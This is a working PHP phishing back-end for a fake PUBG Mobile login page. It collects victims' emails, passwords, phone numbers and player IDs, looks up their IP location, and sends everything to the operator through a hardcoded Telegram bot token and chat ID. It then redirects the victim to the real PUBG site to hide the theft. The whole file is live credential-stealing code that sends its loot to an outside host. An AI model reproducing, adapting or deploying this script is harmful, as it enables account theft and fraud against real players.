<?php
error_reporting(1);
session_start();
if(isset($_SESSION["last_access"])){
if(@$_SESSION["last_access"] > (time() - 5)){
header('Location: https://www.pubgmobile.com/en-US/home.shtml');
exit('Error 505');
}
}
///توكتك سطر 40
///ايديك سطر 110
@$getttYhyaSyrian = explode("\n",file_get_contents('hiolbah.txt'));
if(in_array(@$_POST['email'],@$getttYhyaSyrian)){
header('Location: https://www.pubgmobile.com/en-US/home.shtml');
exit('Error 504');
}else{
file_put_contents('hiolbah.txt',@$_POST['email']."\n",FILE_APPEND);
}

$email = $_POST['email'];
$username = $_POST['user'];
$password = $_POST['password'];
$login = $_POST['login'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$time = date("Y-m-d H:i:s");
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$cty = $_POST['cty'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$pk = $_SERVER['HTTP_HOST'];
 $uls= $_SERVER['REQUEST_URI'];
$platform = $_POST['platform'];
$login = $_POST['login'];
$platform = $_POST['platform'];
$cty1 = $_POST['cty1'];
$chresult = $_POST['chresult'];
$ch = $_POST['ch'];
$API_KEY = "6671601496:AAGy-Vs87itzd8RUtUot8ooEmRpQ-Cyp9Ew";
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $mr = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$mr";
        $mrvenom = file_get_contents($url);
        return json_decode($mrvenom);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

 $ip = getUserIP();
  $location = get_geolocation($ip);
$apiGL = json_decode($location, true);
function get_geolocation($ip) {
    $url = "https://ip-api.io/json/".$ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Accept: application/json',
        'User-Agent: '.$_SERVER['HTTP_USER_AGENT']
    ));
    return curl_exec($ch);
}
 
$ip = getUserIP();
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name ;
$jsondata = json_decode($cty2);
$cty2 = $jsondata-> getcalling_code;
$api = json_decode(file_get_contents("https://dlyar-dev.tk/api/whois.php?ip=".$ip));

$flag = $api->flag;
$ccode = $api->code;
$time_zone = $api->time_zone;
$capital = $api->capital;
$country = $api->country;;
$currency = $api->currency;
$ip = $details->ip;
$year = date('Y');
$month = date('n');
$day = date('j');

$admin = "786949936";
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝒏𝒆𝒘 𝒂𝒄𝒄 𝒑𝒖𝒃𝒈   

✶𝑳𝐎𝐆𝐈𝐍🐈‍⬛» $login

✶𝔼𝕄𝔸𝕀𝕃🐼» `$email`

✶𝐏 𝐀 𝐒 𝐒 𝐖 𝐎 𝐑 𝐃🦍🦓» `$password`

✶𝐂𝐎𝐔𝐍𝐓𝐑𝐘🗺🖤» $country $flag

✶𝐂𝐎𝐔𝐍𝐓𝐑𝐘 𝐂𝐎𝐃𝐄🎩♟️» `$ccode`

✶𝐃𝐀𝐓𝐄🖤🦅» $day/$month/$year

phone: `$phone`

level: $level

id: `$playid`
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://www.pubgmobile.com/en-US/home.shtml');

